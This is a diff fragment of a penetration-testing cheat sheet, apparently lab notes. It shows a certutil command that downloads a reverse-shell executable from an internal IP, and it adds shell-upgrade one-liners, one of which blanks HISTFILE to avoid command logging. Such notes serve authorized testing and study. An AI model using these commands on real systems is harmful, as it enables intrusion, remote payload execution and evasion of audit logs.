@@ -14,6 +14,12 @@ certutil -urlcache -split -f http://192.168.119.199/reverse_5555.exe reverse_555
 
 ## PTY Shells - More Coming soon 
 
+ENV-BASH
+
+```
+env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
+```
+
 ### Python
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
